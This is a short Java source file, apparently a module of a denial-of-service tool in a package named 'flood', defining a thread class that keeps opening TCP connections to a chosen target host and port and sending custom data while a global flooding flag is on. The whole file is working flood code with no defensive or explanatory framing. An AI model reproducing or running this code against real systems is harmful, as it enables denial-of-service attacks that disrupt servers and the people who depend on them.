package com.redpois0n.flood;
import java.net.Socket;

import com.redpois0n.Constants;

public class CUSTOM extends Thread {

	public String target;
	public int port;
	public String data;

	public CUSTOM(String t, int p, String code) {
		target = t;
		port = p;
		this.data = code;
	}

	public void run() {
		while (Constants.flooding) {
			try {
				Socket sock = new Socket(target, port);
				sock.getOutputStream().write(data.getBytes("UTF-8"));
				sock.close();
			} catch (Exception ex) {
				ex.printStackTrace();
				System.exit(0);
			}
		}
	}

}
